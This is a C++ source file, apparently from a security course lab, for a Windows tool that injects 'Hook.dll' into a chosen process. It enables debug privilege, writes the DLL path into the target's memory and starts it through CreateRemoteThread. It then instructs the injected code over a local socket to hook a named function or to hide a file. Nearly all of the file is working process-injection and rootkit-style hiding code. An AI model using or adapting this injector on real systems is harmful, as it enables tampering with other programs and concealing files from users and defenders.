#include "inject.h"





DWORD getProcessID(LPCWSTR targetName) {
    DWORD processID = 0;
    HANDLE snapHandle;
    PROCESSENTRY32 processEntry = { 0 };

    if ((snapHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE) {
        return 0;
    }

    processEntry.dwSize = sizeof(PROCESSENTRY32);
    Process32First(snapHandle, &processEntry);
    do {
        if (wcscmp(processEntry.szExeFile, targetName) == 0) {
            return processEntry.th32ProcessID;
        }
    } while (Process32Next(snapHandle, &processEntry));

    if (snapHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(snapHandle);
    }

    return 0;
}


BOOL setPrivilege(HANDLE hToken, LPCTSTR szPrivName, BOOL fEnable) {
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    LookupPrivilegeValue(NULL, szPrivName, &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    return((GetLastError() == ERROR_SUCCESS));
}



HANDLE InjectDllIntoProccess(DWORD procId, LPCWSTR dllName)
{
    HANDLE hToken = NULL;
    HANDLE hCurrentProc = GetCurrentProcess();
    HANDLE processHandel = NULL;
    LPVOID dll_name = 0;
    SIZE_T dwWritten = 0;
    LPVOID load_library_p = NULL;
    DWORD ThreadID = 0;
    HANDLE hThread = NULL;

    if (!OpenProcessToken(hCurrentProc, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) 
    {
       LAB2_PRINT("OpenProcessToken Error 0x%x", GetLastError());
       return NULL;
    }
    else
    {
        if (!setPrivilege(hToken, SE_DEBUG_NAME, TRUE)) 
        {
            LAB2_PRINT("SetPrivlegesSE_DEBUG_NAME Error 0x%x!", GetLastError());
            return NULL;
        }
    }

    processHandel = OpenProcess(PROCESS_ALL_ACCESS, false, procId);
    dll_name = VirtualAllocEx(processHandel, NULL, MAX_PATH*sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE);
    if (dll_name == NULL)
    {
        LAB2_PRINT("[Error] VirtualAllocEx 0x%x", GetLastError());
        return NULL;
    }
    if (WriteProcessMemory(processHandel, dll_name, dllName,(lstrlen(dllName)+1)*sizeof(TCHAR), &dwWritten) == 0) {
        LAB2_PRINT("[Error]: WriteProcessMemory error 0x%x", GetLastError());
        return NULL;
    }

#ifdef UNICODE
    load_library_p = GetProcAddress(LoadLibrary(TEXT("kernel32.dll")), "LoadLibraryW");
#else
    LPVOID load_library_p = GetProcAddress(LoadLibrary(TEXT("kernek32.dll")), "LoadLibraryA");
#endif // UNICODE

    hThread = CreateRemoteThread(processHandel, NULL, 0, (LPTHREAD_START_ROUTINE)load_library_p, dll_name, 0, &ThreadID);
    if (hThread == NULL) {
        LAB2_PRINT("\n[Error]: creating thread 0x%x!", GetLastError());
        goto COMPLETE;
    }

COMPLETE:
    return hThread;


    return hThread;
}

void usage()
{
	printf("\nInject.exe <target_proc>...");
}


BOOL IsInputCorrect(int argc)
{
    if (argc < 5)
    {
        LAB2_PRINT("\n[Error]: error args.\n");
        return FALSE;
    }
    if (!IsUserAnAdmin()) {
        LAB2_PRINT("\n[Error]: need admin privilege\n");
        return FALSE;
    }
    return TRUE;
}


std::string ParseInput(const std::string &name_of_value, std::vector<std::string>& input, size_t idx)
{
    if (input[idx] != name_of_value)
    {
        return "";
    }
    return input[idx + 1];
}



DWORD GetProcIdPrep(const 
    std::string &proc_name)
{

    DWORD procId = 0;


    wchar_t w_proc_name[myconst::max_length] = { 0 };


    MultiByteToWideChar(CP_UTF8, 0, proc_name.c_str(), -1, w_proc_name, static_cast<int>(proc_name.capacity()));

    procId = getProcessID(w_proc_name);
    if (procId == 0)
    {
        LAB2_PRINT("\n[Error]: Unable to find process %s", proc_name.c_str());
        return 0;
    }
    return procId;
}


int main(int argc, char* argv[])
{

    std::string proc_name;
    std::string proc_pid;
    std::string hide_file;
    std::string hook_func;




    if (!IsInputCorrect(argc))
    {
        return -1;
    }

    std::vector<std::string> input;
    for (int i = 0; i < argc-1; i++)
    {
        input.emplace_back(argv[i + 1]);
    }


    std::string temp = ParseInput(myconst::var_name, input, FIRST_ARG);

    if (temp.empty())   
    {
        temp = ParseInput(myconst::var_pid, input, FIRST_ARG);
        if (temp.empty())
        {
            LAB2_PRINT("[Error]: FIRST_FLAG error");
            return -2;
        }
        proc_pid = temp;
    }
    else
    {   
        proc_name = temp;
    }

    temp.clear();


    temp = ParseInput(myconst::var_func, input, SECOND_ARG);

    if (temp.empty())
    {
        temp = ParseInput(myconst::var_hide, input, SECOND_ARG);
        if (temp.empty())
        {
            LAB2_PRINT("[Error]: SECOND_FLAG error");
            return -3;
        }
        hide_file = temp;

    }
    else
    {
        hook_func = temp;
    }

    temp.clear();





    LAB2_PRINT("\nStarting...");
    DWORD p_id = 0;
    TCHAR full_dll_path[MAX_PATH];
    LPCTSTR dll_name = TEXT("Hook.dll");
    memset(full_dll_path, 0, sizeof(full_dll_path));
    if (GetFullPathName(dll_name, sizeof(full_dll_path) / sizeof(TCHAR), full_dll_path, NULL) == 0)
    {
        LAB2_PRINT("[Error]: GetFullPathName error 0x%x", GetLastError());
    }
    if (proc_pid.empty())
    {
        p_id = GetProcIdPrep(proc_name);
    }
    else
    {
        p_id = atoi(proc_pid.c_str());
    }

   

    SocketServer in(9000, 5);
    HANDLE remoute_thread_h = NULL;


    remoute_thread_h = InjectDllIntoProccess(p_id, full_dll_path);
    if (remoute_thread_h == NULL)
    {
        LAB2_PRINT("\nERROR: Unable to Inject DLL to prosess %s", proc_name.c_str());
        return __LINE__;
    }
    LAB2_PRINT("\nInjection success");
    LAB2_PRINT("\nWaiting for remoute thread...");

    Socket* sock = in.Accept();

    std::string hello_massage = sock->ReceiveLine();
    if (hello_massage.empty())
    {
        LAB2_PRINT("\n[Error] Injection");
        return -1;
    }
    LAB2_PRINT("\nHello message %s", hello_massage.c_str());

    temp.clear();
    std::string data;
    if (hide_file.empty())
    {
        temp = "1";
        data = hook_func;
    }
    else
    {
        temp = "2";
        data = hide_file;
    }
    sock->SendLine(temp);
    sock->SendLine(data);


    WaitForSingleObject(remoute_thread_h, -1);

   
   while (1) 
   {
        std::string r = sock->ReceiveLine();
        if (r.empty()) break;
        if (r[0] == '-') break;
        LAB2_PRINT(" User message: %s\n", r.c_str());
        r.clear();
   }
    LAB2_PRINT("\nComplited!");
    return 0;
}